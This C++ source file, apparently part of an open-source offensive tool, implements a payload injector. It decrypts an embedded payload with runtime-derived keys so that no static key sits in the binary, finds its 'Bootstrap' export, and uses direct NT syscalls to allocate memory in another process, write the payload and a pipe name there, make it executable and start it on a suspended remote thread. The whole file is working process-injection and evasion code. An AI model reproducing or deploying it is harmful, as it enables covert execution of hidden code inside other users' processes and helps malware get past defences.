// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "injector.hpp"
#include "../crypto/crypto.hpp"
#include "../sys/internal_api.hpp"
#include <sstream>

#ifdef COLLECTOR_BUILD
#include "collector_payload_data.hpp"
#else
#include "payload_data.hpp"
#endif

namespace Injector {

    PayloadInjector::PayloadInjector(ProcessManager& process, const Core::Console& console)
        : m_process(process), m_console(console), m_remoteThread(nullptr) {
    }

    PayloadInjector::~PayloadInjector() {
        if (m_remoteThread && m_remoteThread != INVALID_HANDLE_VALUE) {
            NtClose_syscall(m_remoteThread);
            m_remoteThread = nullptr;
        }
    }

    void PayloadInjector::Inject(const std::wstring& pipeName) {
        LoadAndDecryptPayload();

        DWORD offset = GetExportOffset("Bootstrap");
        if (offset == 0) {
            throw std::runtime_error("");
        }

       

        PVOID remoteBase = nullptr;
        SIZE_T payloadSize = m_payload.size();
        SIZE_T pipeNameSize = (pipeName.length() + 1) * sizeof(wchar_t);
        SIZE_T totalSize = payloadSize + pipeNameSize;

        NTSTATUS status = NtAllocateVirtualMemory_syscall(m_process.GetProcessHandle(), &remoteBase, 0,
            &totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (status != 0) throw std::runtime_error("");

        SIZE_T written = 0;
        status = NtWriteVirtualMemory_syscall(m_process.GetProcessHandle(), remoteBase,
            m_payload.data(), payloadSize, &written);
        if (status != 0) throw std::runtime_error("");

        LPVOID remotePipeName = reinterpret_cast<uint8_t*>(remoteBase) + payloadSize;
        status = NtWriteVirtualMemory_syscall(m_process.GetProcessHandle(), remotePipeName,
            (PVOID)pipeName.c_str(), pipeNameSize, &written);
        if (status != 0) throw std::runtime_error("");

        ULONG oldProtect = 0;
        status = NtProtectVirtualMemory_syscall(m_process.GetProcessHandle(), &remoteBase,
            &totalSize, PAGE_EXECUTE_READ, &oldProtect);
        if (status != 0) throw std::runtime_error("");
        uintptr_t entry = reinterpret_cast<uintptr_t>(remoteBase) + offset;

        status = NtCreateThreadEx_syscall(&m_remoteThread, THREAD_ALL_ACCESS, nullptr, m_process.GetProcessHandle(),
            (LPTHREAD_START_ROUTINE)entry, remotePipeName, TRUE, 0, 0, 0, nullptr);

        if (status != 0) {
            throw std::runtime_error("");
        }

    }

    void PayloadInjector::ResumeRemoteThread() {
        if (!m_remoteThread || m_remoteThread == INVALID_HANDLE_VALUE) {
            throw std::runtime_error("");
        }

        ULONG suspendCount = 0;
        NTSTATUS status = NtResumeThread_syscall(m_remoteThread, &suspendCount);

        if (status != 0) {
            throw std::runtime_error("");
        }

    }

    void PayloadInjector::LoadAndDecryptPayload() {
        static_assert(Payload::Embedded::Size > 0, "");

        m_payload.assign(
            Payload::Embedded::Data,
            Payload::Embedded::Data + Payload::Embedded::Size
        );

        // Use runtime-derived keys (no static keys in binary)
        if (!Crypto::DecryptPayload(m_payload)) {
            throw std::runtime_error("");
        }
    }

    DWORD PayloadInjector::GetExportOffset(const char* exportName) {
        auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(m_payload.data());
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return 0;

        auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(m_payload.data() + dosHeader->e_lfanew);
        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return 0;

        auto exportDirRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (exportDirRva == 0) return 0;

        auto RvaToPtr = [&](DWORD rva) -> void* {
            auto section = IMAGE_FIRST_SECTION(ntHeaders);
            for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++section) {
                if (rva >= section->VirtualAddress && rva < section->VirtualAddress + section->Misc.VirtualSize) {
                    return m_payload.data() + section->PointerToRawData + (rva - section->VirtualAddress);
                }
            }
            return nullptr;
            };

        auto exportDir = (PIMAGE_EXPORT_DIRECTORY)RvaToPtr(exportDirRva);
        if (!exportDir) return 0;

        auto names = (DWORD*)RvaToPtr(exportDir->AddressOfNames);
        auto ordinals = (WORD*)RvaToPtr(exportDir->AddressOfNameOrdinals);
        auto funcs = (DWORD*)RvaToPtr(exportDir->AddressOfFunctions);

        if (!names || !ordinals || !funcs) return 0;

        for (DWORD i = 0; i < exportDir->NumberOfNames; ++i) {
            char* name = (char*)RvaToPtr(names[i]);
            if (name && strcmp(name, exportName) == 0) {
                void* funcPtr = RvaToPtr(funcs[ordinals[i]]);
                if (!funcPtr) return 0;
                return (DWORD)((uintptr_t)funcPtr - (uintptr_t)m_payload.data());
            }
        }
        return 0;
    }

}
